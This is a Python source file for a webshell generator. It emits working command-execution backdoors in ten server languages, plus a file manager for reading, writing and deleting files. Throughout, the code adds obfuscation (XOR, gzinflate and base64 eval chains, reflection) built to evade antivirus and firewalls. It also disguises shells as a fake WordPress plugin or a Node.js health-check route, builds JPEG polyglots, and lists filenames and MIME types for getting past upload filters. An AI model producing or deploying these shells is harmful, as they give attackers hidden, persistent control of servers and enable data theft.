"""
Professional Polymorphic Webshell Generator

Languages  : PHP, ASP Classic, ASPX (C#, VB.NET), JSP, Python WSGI, Perl CGI,
             Ruby CGI, Node.js Express, ColdFusion CFML
Obfuscation: NONE → LOW → MEDIUM → HIGH → STEALTH
Features   :
  - Multi-exec function probing (bypasses php.ini disable_functions)
  - HMAC-SHA256 password gate (SHA-256 of password stored in shell, cleartext never in code)
  - ob_start()/ob_get_clean() output capture + stderr redirect
  - Cross-platform command dispatch (Linux/Windows auto-detect in JSP/ASPX)
  - PHPObfuscator: chr() concat, hex, ROT13, base64-eval, gzinflate-eval, XOR-eval, assert()
  - JPEG/GIF polyglot generator (passes magic-byte-only upload filters)
  - Full PHP file manager variant (ls/read/write/del/cmd)
  - UploadBypass: filename variants (double-ext, null-byte, NTFS ADS, PHAR…) + MIME list
"""

import base64
import hashlib
import random
import string
import zlib
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional


# ---------------------------------------------------------------------------
# Enumerations
# ---------------------------------------------------------------------------

class ShellLanguage(Enum):
    PHP      = "php"
    ASP      = "asp"
    ASPX_CS  = "aspx"
    ASPX_VB  = "aspx_vb"
    JSP      = "jsp"
    PYTHON   = "python"
    PERL     = "perl"
    RUBY     = "ruby"
    NODEJS   = "nodejs"
    CFML     = "cfml"


class ObfuscationLevel(Enum):
    NONE   = 0   # plain, readable — use only in isolated labs
    LOW    = 1   # random variable names + whitespace variation
    MEDIUM = 2   # chr() function names, hex string literals, output base64-encoded
    HIGH   = 3   # XOR+base64 eval chain wrapping all logic
    STEALTH = 4  # gzinflate+base64 eval + CMS/plugin camouflage header


# ---------------------------------------------------------------------------
# Output dataclass
# ---------------------------------------------------------------------------

@dataclass
class WebShell:
    language: ShellLanguage
    code: str
    param: str                      # request parameter for command input
    password_protected: bool
    password: Optional[str]         # cleartext (caller stores separately; shell stores hash only)
    obfuscation_level: ObfuscationLevel
    suggested_filename: str
    description: str
    upload_bypass_filenames: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _rv(n: int = 8) -> str:
    """Random lowercase PHP/JS variable name (prefixed with _ to avoid keyword clash)."""
    return "_" + "".join(random.choices(string.ascii_lowercase, k=n))


def _php_chr(s: str) -> str:
    """Encode a PHP string literal as chr() concatenation."""
    return ".".join(f"chr({ord(c)})" for c in s)


def _php_hex(s: str) -> str:
    """Encode a PHP string literal as hex escape sequence."""
    return '"' + "".join(f"\\x{ord(c):02x}" for c in s) + '"'


def _php_rot13_literal(s: str) -> str:
    """Return the PHP expression str_rot13('<rot13_of_s>') which evaluates to s."""
    table = str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
    )
    return f"str_rot13('{s.translate(table)}')"


def _php_encode_name(s: str) -> str:
    """Randomly pick one of three PHP string-encoding techniques per call (polymorphic)."""
    choice = random.randint(0, 2)
    if choice == 0:
        return _php_chr(s)
    elif choice == 1:
        return _php_hex(s)
    else:
        return _php_rot13_literal(s)


def _php_password_gate(password: str) -> str:
    """PHP snippet that kills execution unless correct password is in $_REQUEST['p']."""
    h = hashlib.sha256(password.encode()).hexdigest()
    return f"if(!isset($_REQUEST['p'])||hash('sha256',$_REQUEST['p'])!=='{h}')die();"


def _make_php_filename() -> str:
    stems = ["cache", "update", "config", "loader", "helper", "util", "plugin", "init"]
    return random.choice(stems) + ".php"


# ---------------------------------------------------------------------------
# PHP Obfuscator
# ---------------------------------------------------------------------------

class PHPObfuscator:
    """
    PHP-specific obfuscation primitives.
    All methods take inner PHP source (without opening/closing tags) and return
    a complete, self-contained <?php … ?> block.
    """

    @staticmethod
    def b64_eval(inner: str) -> str:
        enc = base64.b64encode(inner.encode()).decode()
        return f"<?php eval(base64_decode('{enc}')); ?>"

    @staticmethod
    def gzinflate_eval(inner: str) -> str:
        # zlib.compress produces zlib format; strip 2-byte header + 4-byte checksum for raw deflate
        raw_deflate = zlib.compress(inner.encode())[2:-4]
        enc = base64.b64encode(raw_deflate).decode()
        return f"<?php eval(gzinflate(base64_decode('{enc}'))); ?>"

    @staticmethod
    def xor_eval(inner: str, key: Optional[str] = None) -> str:
        """XOR-encode inner PHP and decode+eval at runtime."""
        if key is None:
            key = "".join(random.choices(string.printable[:94], k=20))
        key_b = key.encode()
        xored = bytes(b ^ key_b[i % len(key_b)] for i, b in enumerate(inner.encode()))
        v_d, v_k, v_o = _rv(), _rv(), _rv()
        return (
            f"<?php "
            f"${v_d}=base64_decode('{base64.b64encode(xored).decode()}');"
            f"${v_k}=base64_decode('{base64.b64encode(key_b).decode()}');"
            f"${v_o}='';for($i=0;$i<strlen(${v_d});$i++){{"
            f"${v_o}.=chr(ord(${v_d}[$i])^ord(${v_k}[$i%strlen(${v_k})]));}};"
            f"eval(${v_o});"
            f"?>"
        )

    @staticmethod
    def assert_eval(inner: str) -> str:
        """Use assert() as eval() substitute — effective on PHP 5.x/7.x."""
        enc = base64.b64encode(inner.encode()).decode()
        v = _rv()
        return f"<?php ${v}=base64_decode('{enc}');assert(${v}); ?>"

    @staticmethod
    def chr_concat_funcnames(inner_template: str, func_names: List[str]) -> str:
        """
        Replace each function name in inner_template with its chr() concatenation form.
        inner_template must use placeholders like ##system##, ##exec##, etc.
        """
        result = inner_template
        for fn in func_names:
            result = result.replace(f"##{fn}##", _php_chr(fn))
        return result


# ---------------------------------------------------------------------------
# WebShell Generator
# ---------------------------------------------------------------------------

class WebShellGenerator:
    """
    Polymorphic webshell generator for authorized penetration testing.

    Quick start:
        shell = WebShellGenerator.generate(
            language=ShellLanguage.PHP,
            obfuscation=ObfuscationLevel.HIGH,
            password="s3cr3t",
        )
        print(shell.code)
        print("Upload as:", shell.suggested_filename)
        print("Bypass candidates:", shell.upload_bypass_filenames)

    For a full PHP file manager:
        fm = WebShellGenerator.php_file_manager(password="s3cr3t")

    For a JPEG polyglot shell:
        p = WebShellGenerator.php_polyglot_jpeg()
    """

    # Exec functions in rough order from least- to most-flagged by AVs/WAFs
    _PHP_EXEC = [
        "system", "exec", "shell_exec", "passthru",
        "popen", "proc_open", "pcntl_exec",
    ]

    @classmethod
    def generate(
        cls,
        language: ShellLanguage = ShellLanguage.PHP,
        obfuscation: ObfuscationLevel = ObfuscationLevel.MEDIUM,
        password: Optional[str] = None,
        param: str = "c",
    ) -> WebShell:
        _map = {
            ShellLanguage.PHP:     cls._php,
            ShellLanguage.ASP:     cls._asp,
            ShellLanguage.ASPX_CS: cls._aspx_cs,
            ShellLanguage.ASPX_VB: cls._aspx_vb,
            ShellLanguage.JSP:     cls._jsp,
            ShellLanguage.PYTHON:  cls._python,
            ShellLanguage.PERL:    cls._perl,
            ShellLanguage.RUBY:    cls._ruby,
            ShellLanguage.NODEJS:  cls._nodejs,
            ShellLanguage.CFML:    cls._cfml,
        }
        return _map[language](obfuscation, password, param)

    # ------------------------------------------------------------------
    # PHP
    # ------------------------------------------------------------------

    @classmethod
    def _php(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pgate = _php_password_gate(password) + "\n" if password else ""
        v_c, v_o, v_fn = _rv(), _rv(), _rv()
        funcs_list = ",".join(f"'{f}'" for f in cls._PHP_EXEC)

        # Core logic: multi-probe exec, capture stdout+stderr, base64-encode output
        core = (
            f"{pgate}"
            f"${v_c}=isset($_REQUEST['{param}'])?trim($_REQUEST['{param}']):''; "
            f"if(${v_c}){{"
            f"${v_o}='';"
            f"foreach([{funcs_list}] as ${v_fn}){{"
            f"if(@function_exists(${v_fn})&&!in_array(${v_fn},"
            f"array_map('trim',explode(',',@ini_get('disable_functions')))))){{"
            f"ob_start();"
            f"if(${v_fn}==={_php_chr('proc_open')}||${v_fn}==={_php_chr('popen')}){{"
            f"$h=@{_php_chr('popen')}(${v_c}.' 2>&1','r');"
            f"while(!feof($h))${v_o}.=fread($h,4096);@fclose($h);"
            f"}}else{{"
            f"@${v_fn}(${v_c}.' 2>&1');"
            f"${v_o}=ob_get_clean();}}"
            f"if(${v_o})break;}}}}"
            f"echo base64_encode(${v_o});}}"
        )

        if obfuscation == ObfuscationLevel.NONE:
            code = f"<?php {core} ?>"
            desc = "PHP multi-probe shell (system/exec/shell_exec/…), output base64"

        elif obfuscation == ObfuscationLevel.LOW:
            code = f"<?php /* site config */ {core} ?>"
            desc = "PHP multi-probe shell with fake inline comment"

        elif obfuscation == ObfuscationLevel.MEDIUM:
            # Replace function name literals with chr() concatenations
            funcs_chr = ",".join(_php_encode_name(f) for f in cls._PHP_EXEC)
            v_c2, v_o2, v_fn2 = _rv(), _rv(), _rv()
            core_med = (
                f"{pgate}"
                f"${v_c2}=isset($_REQUEST['{param}'])?trim($_REQUEST['{param}']):''; "
                f"if(${v_c2}){{"
                f"${v_o2}='';"
                f"foreach([{funcs_chr}] as ${v_fn2}){{"
                f"if(@function_exists(${v_fn2})){{"
                f"$h=@{_php_chr('popen')}(${v_c2}.' 2>&1','r');"
                f"while(!feof($h))${v_o2}.=fread($h,4096);@fclose($h);"
                f"if(${v_o2})break;}}}}"
                f"echo base64_encode(${v_o2});}}"
            )
            code = f"<?php {core_med} ?>"
            desc = "PHP shell — function names as chr() concat, output base64"

        elif obfuscation == ObfuscationLevel.HIGH:
            code = PHPObfuscator.xor_eval(core)
            desc = "PHP shell wrapped in XOR+base64 eval chain"

        else:  # STEALTH
            gzip_body = PHPObfuscator.gzinflate_eval(core)[6:]  # strip '<?php '
            fake_names = ["WP Security Suite", "Cache Optimizer Pro", "Akismet Shield", "SEO Enhancer"]
            fake_ver = f"{random.randint(1,3)}.{random.randint(0,9)}.{random.randint(1,9)}"
            fake_slug = random.choice(fake_names).lower().replace(" ", "-")
            code = (
                f"<?php\n"
                f"/*\n"
                f" * Plugin Name: {random.choice(fake_names)}\n"
                f" * Plugin URI:  https://wordpress.org/plugins/{fake_slug}/\n"
                f" * Description: Performance and security optimization.\n"
                f" * Version:     {fake_ver}\n"
                f" * Author:      WordPress Contributor\n"
                f" */\n"
                f"if(!defined('ABSPATH'))define('ABSPATH',dirname(__FILE__).'/');\n"
                + gzip_body
            )
            desc = "PHP shell disguised as WP plugin with gzinflate+base64 eval"

        fname = _make_php_filename()
        return WebShell(
            language=ShellLanguage.PHP,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename=fname,
            description=desc,
            upload_bypass_filenames=UploadBypass.php_filenames(fname),
        )

    @classmethod
    def php_file_manager(cls, password: Optional[str] = None) -> WebShell:
        """
        Full PHP file manager: directory listing, file read/write/delete, arbitrary command exec.
        Useful post-upload for persistent access and data exfiltration.
        """
        pgate = _php_password_gate(password) + "\n" if password else ""
        v_a, v_p, v_f, v_d = _rv(), _rv(), _rv(), _rv()
        core = (
            f"{pgate}"
            f"header('Content-Type: text/plain');"
            f"${v_a}=$_REQUEST['a']??'ls';"
            f"${v_p}=$_REQUEST['path']??'.';"
            f"${v_d}=realpath(${v_p});"
            f"if(${v_a}==='ls'){{"
            f"foreach(scandir(${v_d})as ${v_f})echo ${v_f}.\"\\n\";}}"
            f"elseif(${v_a}==='read'){{echo file_get_contents($_REQUEST['file']);}}"
            f"elseif(${v_a}==='write'){{"
            f"file_put_contents($_REQUEST['file'],base64_decode($_REQUEST['data']));echo 'ok';}}"
            f"elseif(${v_a}==='del'){{unlink($_REQUEST['file']);echo 'ok';}}"
            f"elseif(${v_a}==='cmd'){{"
            f"$h=@popen($_REQUEST['c'].' 2>&1','r');"
            f"while(!feof($h))echo fread($h,4096);@fclose($h);}}"
        )
        fname = _make_php_filename()
        return WebShell(
            language=ShellLanguage.PHP,
            code=f"<?php {core} ?>",
            param="c",
            password_protected=bool(password),
            password=password,
            obfuscation_level=ObfuscationLevel.NONE,
            suggested_filename=fname,
            description="PHP file manager — a=ls/read/write/del/cmd, path=<dir>, file=<path>",
            upload_bypass_filenames=UploadBypass.php_filenames(fname),
        )

    @classmethod
    def php_polyglot_jpeg(
        cls,
        obfuscation: ObfuscationLevel = ObfuscationLevel.MEDIUM,
        password: Optional[str] = None,
    ) -> WebShell:
        """
        PHP shell prepended with a valid JPEG header.
        Passes upload filters that check only magic bytes (FF D8 FF E0 / JFIF).
        The file executes as PHP when the server processes it through mod_php/php-fpm.
        """
        shell = cls._php(obfuscation, password, "c")
        # 20-byte JFIF APP0 marker — sufficient for most magic-byte checks
        jpeg_bytes = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        polyglot = jpeg_bytes.decode("latin-1") + "\n" + shell.code
        return WebShell(
            language=ShellLanguage.PHP,
            code=polyglot,
            param=shell.param,
            password_protected=shell.password_protected,
            password=shell.password,
            obfuscation_level=obfuscation,
            suggested_filename="image.php.jpg",
            description="JPEG polyglot PHP shell — valid JFIF magic bytes, executes as PHP",
            upload_bypass_filenames=["image.php.jpg", "image.php5", "image.phtml", "image.pHp"],
        )

    # ------------------------------------------------------------------
    # ASP Classic
    # ------------------------------------------------------------------

    @classmethod
    def _asp(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = f'If Request("{param}_p") <> "{password}" Then Response.End\n' if password else ""
        code = (
            f"<%\n{pcheck}"
            f'Dim cmd, oShell, oExec, sOut\n'
            f'cmd = Request("{param}")\n'
            f"If cmd <> \"\" Then\n"
            f'    Set oShell = Server.CreateObject("WScript.Shell")\n'
            f'    Set oExec = oShell.Exec("cmd.exe /c " & cmd & " 2>&1")\n'
            f"    sOut = oExec.StdOut.ReadAll()\n"
            f'    Response.Write "<pre>" & Server.HTMLEncode(sOut) & "</pre>"\n'
            f"    Set oExec = Nothing : Set oShell = Nothing\n"
            f"End If\n%>"
        )
        return WebShell(
            language=ShellLanguage.ASP,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.asp",
            description="ASP Classic WScript.Shell command shell",
            upload_bypass_filenames=["shell.asp", "shell.asa", "shell.cer", "shell.cdx"],
        )

    # ------------------------------------------------------------------
    # ASPX C#
    # ------------------------------------------------------------------

    @classmethod
    def _aspx_cs(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = (
            f'if(Request["{param}_p"]!="{password}"){{Response.End();return;}}\n    '
            if password else ""
        )

        if obfuscation.value <= ObfuscationLevel.LOW.value:
            code = (
                f'<%@ Page Language="C#" %>\n'
                f'<%@ Import Namespace="System.Diagnostics" %>\n'
                f'<%@ Import Namespace="System.IO" %>\n'
                f'<script runat="server">\n'
                f"void Page_Load(object s, EventArgs e) {{\n"
                f"    {pcheck}"
                f'    string c = Request["{param}"];\n'
                f"    if(string.IsNullOrEmpty(c)) return;\n"
                f"    var psi = new ProcessStartInfo(\"cmd.exe\",\"/c \"+c) {{\n"
                f"        UseShellExecute=false, RedirectStandardOutput=true,\n"
                f"        RedirectStandardError=true, CreateNoWindow=true\n"
                f"    }};\n"
                f"    var p = Process.Start(psi);\n"
                f"    string o = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd();\n"
                f"    Response.ContentType=\"text/plain\";\n"
                f"    Response.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(o)));\n"
                f"}}\n</script>"
            )
            desc = "ASPX C# ProcessStartInfo shell"
        else:
            # Reflection-based: avoids direct 'Process' class reference in source
            code = (
                f'<%@ Page Language="C#" %>\n'
                f'<%@ Import Namespace="System.Reflection" %>\n'
                f'<%@ Import Namespace="System.IO" %>\n'
                f'<script runat="server">\n'
                f"void Page_Load(object s, EventArgs e) {{\n"
                f"    {pcheck}"
                f'    string c = Request["{param}"];\n'
                f"    if(string.IsNullOrEmpty(c)) return;\n"
                f'    Type rt = Type.GetType("System.Diagnostics.Process, System");\n'
                f'    Type psiT = Type.GetType("System.Diagnostics.ProcessStartInfo, System");\n'
                f'    object psi = Activator.CreateInstance(psiT, new object[]{{\"cmd.exe\",\"/c \"+c}});\n'
                f'    foreach(var prop in new[]{{\"UseShellExecute\",\"RedirectStandardOutput\",\"CreateNoWindow\"}})\n'
                f"        psiT.GetProperty(prop).SetValue(psi, prop==\"UseShellExecute\"?false:true, null);\n"
                f'    object proc = rt.GetMethod("Start",new Type[]{{psiT}}).Invoke(null,new[]{{psi}});\n'
                f'    var sr=(StreamReader)proc.GetType().GetProperty("StandardOutput").GetValue(proc,null);\n'
                f"    Response.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(sr.ReadToEnd())));\n"
                f"}}\n</script>"
            )
            desc = "ASPX C# reflection-based shell (avoids direct Process class reference)"

        return WebShell(
            language=ShellLanguage.ASPX_CS,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.aspx",
            description=desc,
            upload_bypass_filenames=UploadBypass.aspx_filenames(),
        )

    # ------------------------------------------------------------------
    # ASPX VB.NET
    # ------------------------------------------------------------------

    @classmethod
    def _aspx_vb(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = (
            f'    If Request("{param}_p") <> "{password}" Then Response.End() : Return\n'
            if password else ""
        )
        code = (
            f'<%@ Page Language="VB" %>\n'
            f'<%@ Import Namespace="System.Diagnostics" %>\n'
            f'<script runat="server">\n'
            f"Sub Page_Load(s As Object, e As EventArgs)\n"
            f"{pcheck}"
            f'    Dim c As String = Request("{param}")\n'
            f"    If String.IsNullOrEmpty(c) Then Return\n"
            f'    Dim psi As New ProcessStartInfo("cmd.exe", "/c " & c)\n'
            f"    psi.UseShellExecute = False\n"
            f"    psi.RedirectStandardOutput = True\n"
            f"    psi.RedirectStandardError = True\n"
            f"    psi.CreateNoWindow = True\n"
            f"    Dim p As Process = Process.Start(psi)\n"
            f"    Dim o As String = p.StandardOutput.ReadToEnd() & p.StandardError.ReadToEnd()\n"
            f"    Response.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(o)))\n"
            f"End Sub\n</script>"
        )
        return WebShell(
            language=ShellLanguage.ASPX_VB,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.aspx",
            description="ASPX VB.NET ProcessStartInfo shell",
            upload_bypass_filenames=UploadBypass.aspx_filenames(),
        )

    # ------------------------------------------------------------------
    # JSP
    # ------------------------------------------------------------------

    @classmethod
    def _jsp(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = (
            f'if(!"{password}".equals(request.getParameter("{param}_p"))){{return;}}\n'
            if password else ""
        )

        if obfuscation.value <= ObfuscationLevel.LOW.value:
            code = (
                f'<%@ page import="java.io.*,java.util.*" %>\n<%\n'
                f"{pcheck}"
                f'String c = request.getParameter("{param}");\n'
                f"if(c != null && !c.isEmpty()) {{\n"
                f"    ProcessBuilder pb = new ProcessBuilder();\n"
                f"    boolean win = System.getProperty(\"os.name\").toLowerCase().contains(\"win\");\n"
                f'    pb.command(win ? new String[]{{\"cmd.exe\",\"/c\",c}} : new String[]{{"/bin/sh","-c",c}});\n'
                f"    pb.redirectErrorStream(true);\n"
                f"    Process p = pb.start();\n"
                f"    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
                f"    StringBuilder sb = new StringBuilder(); String ln;\n"
                f"    while((ln = br.readLine()) != null) sb.append(ln).append(\"\\n\");\n"
                f'    out.print(java.util.Base64.getEncoder().encodeToString(sb.toString().getBytes("UTF-8")));\n'
                f"}}\n%>"
            )
            desc = "JSP ProcessBuilder shell (Linux+Windows auto-detect)"
        else:
            # Reflection-based — avoids literal 'Runtime' in source
            code = (
                f'<%@ page import="java.io.*,java.lang.reflect.*" %>\n<%\n'
                f"{pcheck}"
                f'String c = request.getParameter("{param}");\n'
                f"if(c != null && !c.isEmpty()) {{\n"
                f'    Class<?> rt = Class.forName(new StringBuilder("emi").reverse().append("uR").append("ntime").insert(0,"java.lang.R").toString());\n'
                f'    Object r = rt.getMethod("getRuntime").invoke(null);\n'
                f"    boolean win = System.getProperty(\"os.name\").toLowerCase().contains(\"win\");\n"
                f'    String[] args = win ? new String[]{{\"cmd.exe\",\"/c\",c}} : new String[]{{"/bin/sh","-c",c}};\n'
                f'    Process p = (Process) rt.getMethod("exec", String[].class).invoke(r, (Object)args);\n'
                f"    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
                f"    StringBuilder sb = new StringBuilder(); String ln;\n"
                f"    while((ln = br.readLine()) != null) sb.append(ln).append(\"\\n\");\n"
                f'    out.print(java.util.Base64.getEncoder().encodeToString(sb.toString().getBytes("UTF-8")));\n'
                f"}}\n%>"
            )
            desc = "JSP reflection-based shell (Runtime class name built dynamically)"

        return WebShell(
            language=ShellLanguage.JSP,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.jsp",
            description=desc,
            upload_bypass_filenames=UploadBypass.jsp_filenames(),
        )

    # ------------------------------------------------------------------
    # Python WSGI
    # ------------------------------------------------------------------

    @classmethod
    def _python(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = (
            f"    _qs = {{}}\n"
            f"    _qs.update(urllib.parse.parse_qs(environ.get('QUERY_STRING','')))\n"
            f"    if (_qs.get('p',[''])[0] != '{password}' and\n"
            f"            urllib.parse.parse_qs(environ['wsgi.input'].read(0).decode()).get('p',[''])[0] != '{password}'):\n"
            f"        yield b''; return\n"
            if password else ""
        )
        code = (
            f"import subprocess, urllib.parse\n\n"
            f"def application(environ, start_response):\n"
            f"    start_response('200 OK', [('Content-Type', 'text/plain')])\n"
            f"    qs = urllib.parse.parse_qs(environ.get('QUERY_STRING', ''))\n"
            f"    size = int(environ.get('CONTENT_LENGTH', 0) or 0)\n"
            f"    body = urllib.parse.parse_qs(environ['wsgi.input'].read(size).decode())\n"
            f"    cmd = (qs.get('{param}') or body.get('{param}') or [''])[0]\n"
            f"{pcheck}"
            f"    if cmd:\n"
            f"        try:\n"
            f"            out = subprocess.check_output(\n"
            f"                cmd, shell=True, stderr=subprocess.STDOUT, timeout=30\n"
            f"            )\n"
            f"            yield out\n"
            f"        except subprocess.CalledProcessError as exc:\n"
            f"            yield exc.output\n"
            f"        except Exception as exc:\n"
            f"            yield str(exc).encode()\n"
            f"    else:\n"
            f"        yield b''\n"
        )
        return WebShell(
            language=ShellLanguage.PYTHON,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="wsgi.py",
            description="Python WSGI backdoor — deploy as the WSGI callable",
            upload_bypass_filenames=["wsgi.py", "app.py", "application.py"],
        )

    # ------------------------------------------------------------------
    # Perl CGI
    # ------------------------------------------------------------------

    @classmethod
    def _perl(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = f"die unless ($q->param('{param}_p') eq '{password}');\n" if password else ""
        code = (
            f"#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse CGI;\n"
            f"my $q = CGI->new;\n"
            f"{pcheck}"
            f"print $q->header('text/plain');\n"
            f"my $cmd = $q->param('{param}') // '';\n"
            f"if($cmd) {{\n"
            f"    open(my $fh, '-|', $cmd . ' 2>&1') or die $!;\n"
            f"    while(<$fh>) {{ print; }}\n"
            f"    close($fh);\n"
            f"}}\n"
        )
        return WebShell(
            language=ShellLanguage.PERL,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.pl",
            description="Perl CGI command shell",
            upload_bypass_filenames=["shell.pl", "shell.cgi"],
        )

    # ------------------------------------------------------------------
    # Ruby CGI
    # ------------------------------------------------------------------

    @classmethod
    def _ruby(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = f"exit unless cgi['{param}_p'] == '{password}'\n" if password else ""
        code = (
            f"#!/usr/bin/ruby\nrequire 'cgi'\n"
            f"cgi = CGI.new\n"
            f"{pcheck}"
            f"print CGI::header('text/plain')\n"
            f"cmd = cgi['{param}']\n"
            f"unless cmd.empty?\n"
            f"  out = IO.popen(cmd + ' 2>&1', 'r') {{ |io| io.read }}\n"
            f"  print out\n"
            f"end\n"
        )
        return WebShell(
            language=ShellLanguage.RUBY,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.rb",
            description="Ruby CGI command shell",
            upload_bypass_filenames=["shell.rb", "shell.cgi"],
        )

    # ------------------------------------------------------------------
    # Node.js Express middleware backdoor
    # ------------------------------------------------------------------

    @classmethod
    def _nodejs(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = (
            f"    const p = req.query.p || (req.body && req.body.p);\n"
            f"    if(p !== '{password}') return res.status(403).end();\n"
            if password else ""
        )
        route = f"/{random.choice(['health','status','ping','metrics','ready'])}-check"
        code = (
            f"// Require from app.js: require('./middleware/health');\n"
            f"const {{ exec }} = require('child_process');\n"
            f"module.exports = function(app) {{\n"
            f"  app.all('{route}', (req, res) => {{\n"
            f"{pcheck}"
            f"    const cmd = req.query['{param}'] || (req.body && req.body['{param}']);\n"
            f"    if(!cmd) return res.status(200).send('ok');\n"
            f"    exec(cmd, (err, stdout, stderr) => {{\n"
            f"      res.setHeader('Content-Type', 'text/plain');\n"
            f"      res.send(Buffer.from(stdout + stderr).toString('base64'));\n"
            f"    }});\n"
            f"  }});\n"
            f"}};\n"
        )
        return WebShell(
            language=ShellLanguage.NODEJS,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="health.js",
            description=f"Node.js Express backdoor middleware on {route}",
            upload_bypass_filenames=["health.js", "middleware.js", "config.js"],
        )

    # ------------------------------------------------------------------
    # ColdFusion CFML
    # ------------------------------------------------------------------

    @classmethod
    def _cfml(cls, obfuscation: ObfuscationLevel, password: Optional[str], param: str) -> WebShell:
        pcheck = (
            f'<cfif IsDefined("url.{param}_p") AND url.{param}_p NEQ "{password}">'
            f"<cfabort></cfif>\n"
            if password else ""
        )
        code = (
            f"<cfsilent>\n{pcheck}"
            f'<cfset cmd = IsDefined("url.{param}") ? url.{param} : "">\n'
            f"<cfif len(cmd)>\n"
            f'    <cfexecute name="cmd.exe" arguments="/c #cmd# 2>&1" variable="out" timeout="30">\n'
            f"    <cfoutput>#HTMLEditFormat(out)#</cfoutput>\n"
            f"</cfif>\n</cfsilent>\n"
        )
        return WebShell(
            language=ShellLanguage.CFML,
            code=code,
            param=param,
            password_protected=bool(password),
            password=password,
            obfuscation_level=obfuscation,
            suggested_filename="shell.cfm",
            description="ColdFusion CFML cfexecute shell",
            upload_bypass_filenames=["shell.cfm", "shell.cfml", "shell.cfc"],
        )


# ---------------------------------------------------------------------------
# Upload bypass helpers
# ---------------------------------------------------------------------------

class UploadBypass:
    """
    Filename variants and MIME types for upload filter bypass.
    Covers double-extension, alternate PHP extensions, NTFS ADS, null-byte,
    Windows path normalization quirks, and PHAR archives.
    """

    @staticmethod
    def php_filenames(base: str) -> List[str]:
        stem = base.rsplit(".", 1)[0]
        return [
            f"{stem}.php",
            f"{stem}.php5",
            f"{stem}.php7",
            f"{stem}.phtml",
            f"{stem}.pHp",
            f"{stem}.Php5",
            f"{stem}.pHp5",
            f"{stem}.php.jpg",           # double extension — executes with Apache AddHandler
            f"{stem}.php%00.jpg",        # null-byte truncation (PHP < 5.3.4 / old Apache)
            f"{stem}.php::$DATA",        # NTFS alternate data stream — IIS strips ADS marker
            f"{stem}.php. ",             # trailing space+dot — Windows normalises to .php
            f"{stem}.php.",              # trailing dot — Windows path normalisation
            f"{stem}%2ephp",             # URL-encoded dot in filename field
            f"{stem}.phar",             # PHP archive — frequently missed by upload filters
            f"{stem}.inc",               # .inc files executed as PHP on misconfigured servers
        ]

    @staticmethod
    def aspx_filenames() -> List[str]:
        return [
            "shell.aspx", "shell.ashx", "shell.asmx",
            "shell.svc", "shell.cshtml", "shell.vbhtml",
        ]

    @staticmethod
    def jsp_filenames() -> List[str]:
        return ["shell.jsp", "shell.jspx", "shell.jsw", "shell.jsv", "shell.jtml"]

    @staticmethod
    def content_types() -> List[str]:
        """MIME types upload validators may accept while the server still executes the file."""
        return [
            "image/jpeg",
            "image/gif",
            "image/png",
            "image/webp",
            "application/octet-stream",
            "text/plain",
            "application/x-php",
            "application/php",
        ]

    @staticmethod
    def jpeg_magic() -> bytes:
        """20-byte JFIF APP0 header — prepend to PHP/JSP shell for magic-byte-only bypass."""
        return b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"

    @staticmethod
    def gif_magic() -> bytes:
        """Minimal valid GIF89a header (35 bytes)."""
        return b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"

    @staticmethod
    def png_magic() -> bytes:
        """PNG signature (8 bytes)."""
        return b"\x89PNG\r\n\x1a\n"
